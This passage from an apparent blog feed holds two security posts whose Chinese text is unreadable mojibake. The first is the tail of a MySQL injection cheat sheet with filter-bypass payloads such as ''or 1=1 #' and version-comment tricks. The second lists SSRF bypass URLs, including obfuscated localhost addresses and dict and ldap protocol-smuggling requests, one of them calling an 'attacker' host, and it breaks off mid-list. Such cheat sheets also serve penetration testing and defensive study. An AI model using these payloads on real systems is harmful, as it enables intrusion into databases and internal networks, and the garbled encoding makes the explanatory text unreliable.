é—®é¢˜è€Œäº§ç”Ÿçš„SQLæ³¨å…¥</li><li>ä¸éœ€è¦è·³å‡ºå•å¼•å·çš„æƒ…å†µï¼šå­—ç¬¦ä¸²å¯ç”¨åå…­è¿›åˆ¶è¡¨ç¤ºï¼Œä¹Ÿå¯é€šè¿‡è¿›åˆ¶è½¬æ¢å‡½æ•°è¡¨ç¤ºæˆå…¶ä»–è¿›åˆ¶ï¼Œæ± base_con</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">åè¿›åˆ¶è½¬æ¢æˆäºŒè¿›åˆ¶</span><br><span class="line">select bin(5);</span><br><span class="line">åè¿›åˆ¶è½¬æ¢æˆå…«è¿›åˆ¶</span><br><span class="line">select oct(5);</span><br><span class="line">åè¿›åˆ¶è½¬æ¢æˆåå…­è¿›åˆ¶</span><br><span class="line">select hex(5);</span><br><span class="line">äºŒè¿›åˆ¶è½¬æ¢æˆåè¿›åˆ¶</span><br><span class="line">select conv(&#39;101&#39;,2,10);</span><br><span class="line">åè¿›åˆ¶è½¬æ¢æˆåå…­è¿›åˆ¶</span><br><span class="line">select conv(&#39;20&#39;,10,16);</span><br><span class="line">è¿˜åŸåå…­è¿›åˆ¶</span><br><span class="line">unhex(conv(DEC_DATA,10,16))</span><br></pre></td></tr></table></figure><h4 id="æ•°å­—"><a href="#æ•°å­—" class="headerlink" title="æ•°å­—"></a>æ•°å­—</h4><table><thead><tr><th>ä»£æ›¿å­—ç¬¦</th><th>æ•°</th><th>ä»£æ›¿å­—ç¬¦</th><th>æ•°</th><th>å­—</th><th>ä»£æ›¿å­—ç¬¦</th><th>æ•°</th><th>å­—</th></tr></thead><tbody><tr><td>falseã€!pi()</td><td>0</td><td>ceil(pi()*pi())</td><td>10</td><td>A</td><td>ceil((pi()+pi())*pi())</td><td>20</td><td>K</td></tr><tr><td>trueã€!(!pi())</td><td>1</td><td>ceil(pi()*pi())+true</td><td>11</td><td>B</td><td>ceil(ceil(pi())*version())</td><td>21</td><td>L</td></tr><tr><td>true+true</td><td>2</td><td>ceil(pi()+pi()+version())</td><td>12</td><td>C</td><td>ceil(pi()*ceil(pi()+pi()))</td><td>22</td><td>M</td></tr><tr><td>floor(pi())ã€~~pi()</td><td>3</td><td>floor(pi()*pi()+pi())</td><td>13</td><td>D</td><td>ceil((pi()+ceil(pi()))*pi())</td><td>23</td><td>N</td></tr><tr><td>ceil(pi())</td><td>4</td><td>ceil(pi()*pi()+pi())</td><td>14</td><td>E</td><td>ceil(pi())*ceil(version())</td><td>24</td><td>O</td></tr><tr><td>floor(version()) //æ³¨æ„ç‰ˆæœ¬</td><td>5</td><td>ceil(pi()*pi()+version())</td><td>15</td><td>F</td><td>floor(pi()*(version()+pi()))</td><td>25</td><td>P</td></tr><tr><td>ceil(version())</td><td>6</td><td>floor(pi()*version())</td><td>16</td><td>G</td><td>floor(version()*version())</td><td>26</td><td>Q</td></tr><tr><td>ceil(pi()+pi())</td><td>7</td><td>ceil(pi()*version())</td><td>17</td><td>H</td><td>ceil(version()*version())</td><td>27</td><td>R</td></tr><tr><td>floor(version()+pi())</td><td>8</td><td>ceil(pi()*version())+true</td><td>18</td><td>I</td><td>ceil(pi()*pi()*pi()-pi())</td><td>28</td><td>S</td></tr><tr><td>floor(pi()*pi())</td><td>9</td><td>floor((pi()+pi())*pi())</td><td>19</td><td>J</td><td>floor(pi()*pi()*floor(pi()))</td><td>29</td><td>T</td></tr></tbody></table><hr><h3 id="å…¶å®ƒ"><a href="#å…¶å®ƒ" class="headerlink" title="å…¶å®ƒ"></a>å…¶å®ƒ</h3><h4 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">--</span><br><span class="line">&#x2F;*(MySQL-5.1)</span><br><span class="line">&#x2F;**&#x2F;(ä¸€ä¸ª *&#x2F; å¯ä»¥é—­åˆå‰é¢å¤šä¸ª&#x2F;*)</span><br><span class="line">;%00(PDOæ”¯æ´å¤šèªå¥)</span><br><span class="line">&#96;(MySQL &lt;&#x3D; 5.5)</span><br><span class="line">&#39;or 1&#x3D;1;%00</span><br><span class="line">&#39;or 1&#x3D;1 union select 1,2&#96;&#39;</span><br><span class="line">&#39;or 1&#x3D;1 #</span><br><span class="line">&#39;&#x2F;*!50000or*&#x2F; 1&#x3D;1 -- -      &#x2F;&#x2F;ç‰ˆæœ¬å·ä¸º5.1.38æ—¶åªè¦å°äº50138</span><br><span class="line">&#39;&#x2F;*!or*&#x2F; 1&#x3D;1 -- -</span><br></pre></td></tr></table></figure><h4 id="å¸¸ç”¨"><a href="#å¸¸ç”¨" class="headerlink" title="å¸¸ç”¨"></a>å¸¸ç”¨</h4><h5 id="è¿ç®—ç¬¦"><a href="#è¿ç®—ç¬¦" class="headerlink" title="è¿ç®—ç¬¦"></a>è¿ç®—ç¬¦</h5><table><thead><tr><th>è¿ç®—ç¬¦</th><th>è¯´æ˜</th><th>è¿ç®—ç¬¦</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>&amp;&amp;</td><td>ä¸ï¼ŒåŒand</td><td>||</td><td>æˆ–ï¼ŒåŒor</td></tr><tr><td>!</td><td>éï¼ŒåŒnot</td><td>~</td><td>ä¸€å…ƒæ¯”ç‰¹åè½¬</td></tr><tr><td>^</td><td>å¼‚æˆ–ï¼ŒåŒxor</td><td>+</td><td>åŠ ï¼Œå¯æ›¿ä»£ç©ºæ ¼ï¼Œå¦‚ <code>select+user()</code></td></tr></tbody></table><h5 id="ç³»ç»Ÿä¿¡æ¯å‡½æ•°"><a href="#ç³»ç»Ÿä¿¡æ¯å‡½æ•°" class="headerlink" title="ç³»ç»Ÿä¿¡æ¯å‡½æ•°"></a>ç³»ç»Ÿä¿¡æ¯å‡½æ•°</h5><table><thead><tr><th>å‡½æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>USER()</td><td>è·å–å½“å‰æ“ä½œå¥æŸ„çš„ç”¨æˆ·åï¼ŒåŒ SESSION_USER()ã€CURRENT_USER()ï¼Œæœ‰æ—¶ä¹Ÿç”¨ SYSTEM_USER()</td></tr><tr><td>DATABASE()</td><td>è·å–å½“å‰é€‰æ‹©çš„æ•°æ®åº“åï¼ŒåŒ SCHEMA()</td></tr><tr><td>VERSION()</td><td>è·å–å½“å‰ç‰ˆæœ¬ä¿¡æ¯</td></tr></tbody></table><h5 id="è¿›åˆ¶è½¬æ¢"><a href="#è¿›åˆ¶è½¬æ¢" class="headerlink" title="è¿›åˆ¶è½¬æ¢"></a>è¿›åˆ¶è½¬æ¢</h5><table><thead><tr><th>å‡½æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>ORD(str)</td><td>è¿”å›å­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ASCIIå€¼</td></tr><tr><td>OCT(N)</td><td>ä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å› <code>N</code> çš„å…«è¿›åˆ¶æ•°ï¼Œ<code>N</code> æ˜¯ä¸€ä¸ªBIGINT å‹æ•°å€¼ï¼Œä½œç”¨ç›¸å½“äº<code>CONV(N,10,8)</code></td></tr><tr><td>HEX(N_S)</td><td>å‚æ•°ä¸ºå­—ç¬¦ä¸²æ—¶ï¼Œè¿”å› <code>N_or_S</code> çš„16è¿›åˆ¶å­—ç¬¦ä¸²å½¢å¼ï¼Œä¸ºæ•°å­—æ—¶ï¼Œè¿”å›å…¶16è¿›åˆ¶æ•°å½¢å¼</td></tr><tr><td>UNHEX(str)</td><td><code>HEX(str)</code> çš„é€†å‘å‡½æ•°ã€‚å°†å‚æ•°ä¸­çš„æ¯ä¸€å¯¹16è¿›åˆ¶æ•°å­—éƒ½è½¬æ¢ä¸º10è¿›åˆ¶æ•°å­—ï¼Œç„¶åå†è½¬æ¢æˆ ASCII ç æ‰€å¯¹åº”çš„å­—ç¬¦</td></tr><tr><td>BIN(N)</td><td>è¿”å›åè¿›åˆ¶æ•°å€¼ <code>N</code> çš„äºŒè¿›åˆ¶æ•°å€¼çš„å­—ç¬¦ä¸²è¡¨ç°å½¢å¼</td></tr><tr><td>ASCII(str)</td><td>åŒ<code>ORD(string)</code></td></tr><tr><td>CONV(N,from_base,to_base)</td><td>å°†æ•°å€¼å‹å‚æ•° <code>N</code> ç”±åˆå§‹è¿›åˆ¶ <code>from_base</code> è½¬æ¢ä¸ºç›®æ ‡è¿›åˆ¶ <code>to_base</code> çš„å½¢å¼å¹¶è¿”å›</td></tr><tr><td>CHAR(N,â€¦ [USING charset_name])</td><td>å°†æ¯ä¸€ä¸ªå‚æ•° <code>N</code> éƒ½è§£é‡Šä¸ºæ•´æ•°ï¼Œè¿”å›ç”±è¿™äº›æ•´æ•°åœ¨ ASCII ç ä¸­æ‰€å¯¹åº”å­—ç¬¦æ‰€ç»„æˆçš„å­—ç¬¦ä¸²</td></tr></tbody></table><h5 id="å­—ç¬¦æˆªå–-æ‹¼æ¥"><a href="#å­—ç¬¦æˆªå–-æ‹¼æ¥" class="headerlink" title="å­—ç¬¦æˆªå–/æ‹¼æ¥"></a>å­—ç¬¦æˆªå–/æ‹¼æ¥</h5><table><thead><tr><th>å‡½æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>SUBSTR(str,N_start,N_length)</td><td>å¯¹æŒ‡å®šå­—ç¬¦ä¸²è¿›è¡Œæˆªå–ï¼Œä¸ºSUBSTRINGçš„ç®€å•ç‰ˆ</td></tr><tr><td>SUBSTRING()</td><td>å¤šç§æ ¼å¼<code>SUBSTRING(str,pos)ã€SUBSTRING(str FROM pos)ã€SUBSTRING(str,pos,len)ã€SUBSTRING(str FROM pos FOR len)</code></td></tr><tr><td>RIGHT(str,len)</td><td>å¯¹æŒ‡å®šå­—ç¬¦ä¸²ä»æœ€å³è¾¹æˆªå–æŒ‡å®šé•¿åº¦</td></tr><tr><td>LEFT(str,len)</td><td>å¯¹æŒ‡å®šå­—ç¬¦ä¸²ä»æœ€å·¦è¾¹æˆªå–æŒ‡å®šé•¿åº¦</td></tr><tr><td>RPAD(str,len,padstr)</td><td>åœ¨ <code>str</code> å³æ–¹è¡¥é½ <code>len</code> ä½çš„å­—ç¬¦ä¸² <code>padstr</code>ï¼Œè¿”å›æ–°å­—ç¬¦ä¸²ã€‚å¦‚æœ <code>str</code> é•¿åº¦å¤§äº <code>len</code>ï¼Œåˆ™è¿”å›å€¼çš„é•¿åº¦å°†ç¼©å‡åˆ° <code>len</code> æ‰€æŒ‡å®šçš„é•¿åº¦</td></tr><tr><td>LPAD(str,len,padstr)</td><td>ä¸RPADç›¸ä¼¼ï¼Œåœ¨<code>str</code>å·¦è¾¹è¡¥é½</td></tr><tr><td>MID(str,pos,len)</td><td>åŒäº <code>SUBSTRING(str,pos,len)</code></td></tr><tr><td>INSERT(str,pos,len,newstr)</td><td>åœ¨åŸå§‹å­—ç¬¦ä¸² <code>str</code> ä¸­ï¼Œå°†è‡ªå·¦æ•°ç¬¬ <code>pos</code> ä½å¼€å§‹ï¼Œé•¿åº¦ä¸º <code>len</code> ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²æ›¿æ¢ä¸ºæ–°å­—ç¬¦ä¸² <code>newstr</code>ï¼Œç„¶åè¿”å›ç»è¿‡æ›¿æ¢åçš„å­—ç¬¦ä¸²ã€‚<code>INSERT(str,len,1,0x0)</code>å¯å½“åšæˆªå–å‡½æ•°</td></tr><tr><td>CONCAT(str1,str2â€¦)</td><td>å‡½æ•°ç”¨äºå°†å¤šä¸ªå­—ç¬¦ä¸²åˆå¹¶ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²</td></tr><tr><td>GROUP_CONCAT(â€¦)</td><td>è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ç»“æœï¼Œè¯¥ç»“æœç”±åˆ†ç»„ä¸­çš„å€¼è¿æ¥ç»„åˆè€Œæˆ</td></tr><tr><td>MAKE_SET(bits,str1,str2,â€¦)</td><td>æ ¹æ®å‚æ•°1ï¼Œè¿”å›æ‰€è¾“å…¥å…¶ä»–çš„å‚æ•°å€¼ã€‚å¯ç”¨ä½œå¸ƒå°”ç›²æ³¨ï¼Œå¦‚ï¼š<code>EXP(MAKE_SET((LENGTH(DATABASE())&gt;8)+1,&#39;1&#39;,&#39;710&#39;))</code></td></tr></tbody></table><h5 id="å¸¸è§å…¨å±€å˜é‡"><a href="#å¸¸è§å…¨å±€å˜é‡" class="headerlink" title="å¸¸è§å…¨å±€å˜é‡"></a>å¸¸è§å…¨å±€å˜é‡</h5><table><thead><tr><th>å˜é‡</th><th>è¯´æ˜</th><th>å˜é‡</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>@@VERSION</td><td>è¿”å›ç‰ˆæœ¬ä¿¡æ¯</td><td>@@HOSTNAME</td><td>è¿”å›å®‰è£…çš„è®¡ç®—æœºåç§°</td></tr><tr><td>@@GLOBAL.VERSION</td><td>åŒ<code>@@VERSION</code></td><td>@@BASEDIR</td><td>è¿”å›MYSQLç»å¯¹è·¯å¾„</td></tr></tbody></table><p>å¯ä»¥ç”¨ <code>SHOW GLOBAL VARIABLES;</code> æŸ¥çœ‹å…¨éƒ¨å…¨å±€å˜é‡</p><h5 id="å…¶ä»–å¸¸ç”¨å‡½æ•°-è¯­å¥"><a href="#å…¶ä»–å¸¸ç”¨å‡½æ•°-è¯­å¥" class="headerlink" title="å…¶ä»–å¸¸ç”¨å‡½æ•° / è¯­å¥"></a>å…¶ä»–å¸¸ç”¨å‡½æ•° / è¯­å¥</h5><table><thead><tr><th>å‡½æ•°/è¯­å¥</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>LENGTH(str)</td><td>è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦</td></tr><tr><td>PI()</td><td>è¿”å›Ï€çš„å…·ä½“æ•°å€¼</td></tr><tr><td>REGEXP â€œstatementâ€</td><td>æ­£åˆ™åŒ¹é…æ•°æ®ï¼Œè¿”å›å€¼ä¸ºå¸ƒå°”å€¼</td></tr><tr><td>LIKE â€œstatementâ€</td><td>åŒ¹é…æ•°æ®ï¼Œ%ä»£è¡¨ä»»æ„å†…å®¹ã€‚è¿”å›å€¼ä¸ºå¸ƒå°”å€¼</td></tr><tr><td>RLIKE â€œstatementâ€</td><td>ä¸regexpç›¸åŒ</td></tr><tr><td>LOCATE(substr,str,[pos])</td><td>è¿”å›å­å­—ç¬¦ä¸²ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®</td></tr><tr><td>POSITION(substr IN str)</td><td>ç­‰åŒäº <code>LOCATE()</code></td></tr><tr><td>LOWER(str)</td><td>å°†å­—ç¬¦ä¸²çš„å¤§å†™å­—æ¯å…¨éƒ¨è½¬æˆå°å†™ã€‚åŒï¼š<code>LCASE(str)</code></td></tr><tr><td>UPPER(str)</td><td>å°†å­—ç¬¦ä¸²çš„å°å†™å­—æ¯å…¨éƒ¨è½¬æˆå¤§å†™ã€‚åŒï¼š<code>UCASE(str)</code></td></tr><tr><td>ELT(N,str1,str2,str3,â€¦)</td><td>ä¸<code>MAKE_SET(bit,str1,str2...)</code>ç±»ä¼¼ï¼Œæ ¹æ®<code>N</code>è¿”å›å‚æ•°å€¼</td></tr><tr><td>NULLIF(expr1,expr2)</td><td>è‹¥expr1ä¸expr2ç›¸åŒï¼Œåˆ™è¿”å›expr1ï¼Œå¦åˆ™è¿”å›NULL</td></tr><tr><td>CHARSET(str)</td><td>è¿”å›å­—ç¬¦ä¸²ä½¿ç”¨çš„å­—ç¬¦é›†</td></tr><tr><td>DECODE(<em>crypt_str</em>,<em>pass_str</em>)</td><td>ä½¿ç”¨ pass_str ä½œä¸ºå¯†ç ï¼Œè§£å¯†åŠ å¯†å­—ç¬¦ä¸² crypt_strã€‚åŠ å¯†å‡½æ•°ï¼š<code>ENCODE(str,pass_str)</code></td></tr></tbody></table><hr>]]></content>
      
      
      <categories>
          
          <category> æ™ºæ…§çš„æ”¶è— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRFçš„ä¸€äº›tricks</title>
      <link href="2021/04/25/SSRF%E7%9A%84%E4%B8%80%E4%BA%9Btricks/"/>
      <url>2021/04/25/SSRF%E7%9A%84%E4%B8%80%E4%BA%9Btricks/</url>
      
        <content type="html"><![CDATA[<p>SSRF æ˜¯ä»€ä¹ˆï¼Ÿç®€å•åœ°æ¥è¯´ï¼šåˆ©ç”¨ä¸€ä¸ªå¯ä»¥å‘èµ·ç½‘ç»œè¯·æ±‚çš„æœåŠ¡å½“ä½œè·³æ¿æ¥æ”»å‡»å†…éƒ¨å…¶ä»–æœåŠ¡</p><p>å¯ä»¥ç”¨æ¥ï¼š</p><ul><li>æ¢æµ‹å†…ç½‘ä¿¡æ¯</li><li>æ”»å‡»å†…ç½‘æˆ–æœ¬åœ°å…¶ä»–æœåŠ¡</li><li>ç©¿é€é˜²ç«å¢™</li></ul><p>å¯»æ‰¾æ–¹æ³•ï¼š</p><ul><li>èƒ½å¤Ÿå¯¹å¤–å‘èµ·ç½‘ç»œè¯·æ±‚çš„åœ°æ–¹</li><li>è¯·æ±‚è¿œç¨‹æœåŠ¡å™¨èµ„æºçš„åœ°æ–¹</li><li>æ•°æ®åº“å†…ç½®åŠŸèƒ½</li><li>é‚®ä»¶ç³»ç»Ÿ</li><li>æ–‡ä»¶å¤„ç†</li><li>åœ¨çº¿å¤„ç†å·¥å…·</li></ul><h2 id="ä¸€äº›ç»•è¿‡çš„æ–¹æ³•"><a href="#ä¸€äº›ç»•è¿‡çš„æ–¹æ³•" class="headerlink" title="ä¸€äº›ç»•è¿‡çš„æ–¹æ³•"></a>ä¸€äº›ç»•è¿‡çš„æ–¹æ³•</h2><h3 id="0x00-æ”»å‡»æœ¬åœ°"><a href="#0x00-æ”»å‡»æœ¬åœ°" class="headerlink" title="0x00 æ”»å‡»æœ¬åœ°"></a>0x00 æ”»å‡»æœ¬åœ°</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:80</span><br><span class="line">http:&#x2F;&#x2F;localhost:22</span><br></pre></td></tr></table></figure><h3 id="0x01-åˆ©ç”¨ipv6"><a href="#0x01-åˆ©ç”¨ipv6" class="headerlink" title="0x01 åˆ©ç”¨ipv6"></a>0x01 åˆ©ç”¨ipv6</h3><p>åˆ©ç”¨[::]ç»•è¿‡localhost</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[::1]&#x2F; &gt;&gt;&gt; http:&#x2F;&#x2F;127.0.0.1</span><br><span class="line">http:&#x2F;&#x2F;[::]&#x2F;  &gt;&gt;&gt;  http:&#x2F;&#x2F;0.0.0.0</span><br></pre></td></tr></table></figure><p>ä¹Ÿæœ‰ <code>http://0000::1:80/</code> è¿™ç§</p><h3 id="0x02-åˆ©ç”¨"><a href="#0x02-åˆ©ç”¨" class="headerlink" title="0x02 åˆ©ç”¨@"></a>0x02 åˆ©ç”¨@</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com@127.0.0.1</span><br></pre></td></tr></table></figure><h3 id="0x03-åˆ©ç”¨çŸ­åœ°å€"><a href="#0x03-åˆ©ç”¨çŸ­åœ°å€" class="headerlink" title="0x03 åˆ©ç”¨çŸ­åœ°å€"></a>0x03 åˆ©ç”¨çŸ­åœ°å€</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;dwz.cn&#x2F;11SMa  &gt;&gt;&gt;  http:&#x2F;&#x2F;127.0.0.1</span><br></pre></td></tr></table></figure><h3 id="0x04-åˆ©ç”¨ç‰¹æ®ŠåŸŸå"><a href="#0x04-åˆ©ç”¨ç‰¹æ®ŠåŸŸå" class="headerlink" title="0x04 åˆ©ç”¨ç‰¹æ®ŠåŸŸå"></a>0x04 åˆ©ç”¨ç‰¹æ®ŠåŸŸå</h3><p>åˆ©ç”¨çš„åŸç†æ˜¯DNSè§£æ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1.xip.io&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;www.owasp.org.127.0.0.1.xip.io&#x2F;</span><br></pre></td></tr></table></figure><h3 id="0x05-åˆ©ç”¨DNSè§£æ"><a href="#0x05-åˆ©ç”¨DNSè§£æ" class="headerlink" title="0x05 åˆ©ç”¨DNSè§£æ"></a>0x05 åˆ©ç”¨DNSè§£æ</h3><p>åœ¨åŸŸåä¸Šè®¾ç½®Aè®°å½•ï¼ŒæŒ‡å‘127.0.1</p><h3 id="0x06-åˆ©ç”¨ä¿®æ”¹ä¸Šä¼ "><a href="#0x06-åˆ©ç”¨ä¿®æ”¹ä¸Šä¼ " class="headerlink" title="0x06 åˆ©ç”¨ä¿®æ”¹ä¸Šä¼ "></a>0x06 åˆ©ç”¨ä¿®æ”¹ä¸Šä¼ </h3><p>æ¯”å¦‚å¯ä»¥ä¿®æ”¹ â€œtype=fileâ€ ä¸º â€œtype=urlâ€<br>å°†å›¾ç‰‡æ–‡ä»¶ä¿®æ”¹ä¸ºURLï¼Œå³å¯èƒ½è§¦å‘ SSRF</p><h3 id="0x07-åˆ©ç”¨Enclosed-alphanumerics"><a href="#0x07-åˆ©ç”¨Enclosed-alphanumerics" class="headerlink" title="0x07 åˆ©ç”¨Enclosed alphanumerics"></a>0x07 åˆ©ç”¨Enclosed alphanumerics</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">åˆ©ç”¨Enclosed alphanumerics</span><br><span class="line">â“”â“§â“â“œâ“Ÿâ“›â“”.â“’â“â“œ  &gt;&gt;&gt;  example.com</span><br><span class="line">List:</span><br><span class="line">â‘  â‘¡ â‘¢ â‘£ â‘¤ â‘¥ â‘¦ â‘§ â‘¨ â‘© â‘ª â‘« â‘¬ â‘­ â‘® â‘¯ â‘° â‘± â‘² â‘³ </span><br><span class="line">â‘´ â‘µ â‘¶ â‘· â‘¸ â‘¹ â‘º â‘» â‘¼ â‘½ â‘¾ â‘¿ â’€ â’ â’‚ â’ƒ â’„ â’… â’† â’‡ </span><br><span class="line">â’ˆ â’‰ â’Š â’‹ â’Œ â’ â’ â’ â’ â’‘ â’’ â’“ â’” â’• â’– â’— â’˜ â’™ â’š â’› </span><br><span class="line">â’œ â’ â’ â’Ÿ â’  â’¡ â’¢ â’£ â’¤ â’¥ â’¦ â’§ â’¨ â’© â’ª â’« â’¬ â’­ â’® â’¯ â’° â’± â’² â’³ â’´ â’µ </span><br><span class="line">â’¶ â’· â’¸ â’¹ â’º â’» â’¼ â’½ â’¾ â’¿ â“€ â“ â“‚ â“ƒ â“„ â“… â“† â“‡ â“ˆ â“‰ â“Š â“‹ â“Œ â“ â“ â“ </span><br><span class="line">â“ â“‘ â“’ â““ â“” â“• â“– â“— â“˜ â“™ â“š â“› â“œ â“ â“ â“Ÿ â“  â“¡ â“¢ â“£ â“¤ â“¥ â“¦ â“§ â“¨ â“© </span><br><span class="line">â“ª â“« â“¬ â“­ â“® â“¯ â“° â“± â“² â“³ â“´ </span><br><span class="line">â“µ â“¶ â“· â“¸ â“¹ â“º â“» â“¼ â“½ â“¾ â“¿</span><br></pre></td></tr></table></figure><h3 id="0x08-åˆ©ç”¨å¥å·"><a href="#0x08-åˆ©ç”¨å¥å·" class="headerlink" title="0x08 åˆ©ç”¨å¥å·"></a>0x08 åˆ©ç”¨å¥å·</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127ã€‚0ã€‚0ã€‚1  &gt;&gt;&gt;  127.0.0.1</span><br></pre></td></tr></table></figure><h3 id="0x09-åˆ©ç”¨è¿›åˆ¶è½¬æ¢"><a href="#0x09-åˆ©ç”¨è¿›åˆ¶è½¬æ¢" class="headerlink" title="0x09 åˆ©ç”¨è¿›åˆ¶è½¬æ¢"></a>0x09 åˆ©ç”¨è¿›åˆ¶è½¬æ¢</h3><p>å¯ä»¥æ˜¯åå…­è¿›åˆ¶ï¼Œå…«è¿›åˆ¶ç­‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">115.239.210.26  &gt;&gt;&gt;  16373751032</span><br><span class="line">http:&#x2F;&#x2F;016373751032&#x2F;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæŠŠè¿™å››æ®µæ•°å­—ç»™åˆ†åˆ«è½¬æˆ16è¿›åˆ¶ï¼Œç»“æœï¼š73 ef d2 1a<br>ç„¶åæŠŠ 73efd21a è¿™åå…­è¿›åˆ¶ä¸€èµ·è½¬æ¢æˆå…«è¿›åˆ¶<br>è®°å¾—è®¿é—®çš„æ—¶å€™åŠ  0 è¡¨ç¤ºä½¿ç”¨å…«è¿›åˆ¶(å¯ä»¥æ˜¯ä¸€ä¸ª0ä¹Ÿå¯ä»¥æ˜¯å¤šä¸ª0ï¼Œè·ŸXSSä¸­å¤šåŠ å‡ ä¸ª0æ¥ç»•è¿‡è¿‡æ»¤ä¸€æ ·)ï¼Œåå…­è¿›åˆ¶åŠ 0x</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;0177.0.0.1&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;2130706433&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;192.168.0.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;3232235521&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;192.168.1.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;3232235777&#x2F;</span><br></pre></td></tr></table></figure><h3 id="0x0A-åˆ©ç”¨ç‰¹æ®Šåœ°å€"><a href="#0x0A-åˆ©ç”¨ç‰¹æ®Šåœ°å€" class="headerlink" title="0x0A åˆ©ç”¨ç‰¹æ®Šåœ°å€"></a>0x0A åˆ©ç”¨ç‰¹æ®Šåœ°å€</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0&#x2F;</span><br></pre></td></tr></table></figure><h3 id="0x0B-åˆ©ç”¨åè®®"><a href="#0x0B-åˆ©ç”¨åè®®" class="headerlink" title="0x0B åˆ©ç”¨åè®®"></a>0x0B åˆ©ç”¨åè®®</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Dict:&#x2F;&#x2F;</span><br><span class="line">dict:&#x2F;&#x2F;&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;&#x2F;d:&lt;word&gt;</span><br><span class="line">ssrf.php?url&#x3D;dict:&#x2F;&#x2F;attacker:11111&#x2F;</span><br><span class="line">SFTP:&#x2F;&#x2F;</span><br><span class="line">ssrf.php?url&#x3D;sftp:&#x2F;&#x2F;example.com:11111&#x2F;</span><br><span class="line">TFTP:&#x2F;&#x2F;</span><br><span class="line">ssrf.php?url&#x3D;tftp:&#x2F;&#x2F;example.com:12346&#x2F;TESTUDPPACKET</span><br><span class="line">LDAP:&#x2F;&#x2F;</span><br><span class="line">ssrf.php?url&#x3D;ldap:&#x2F;&#x2F;localhost:11211&#x2F;%0astats%0aquit</span><br><span class="line">Gopher:&#x2F;&#x2F;</span><br><span 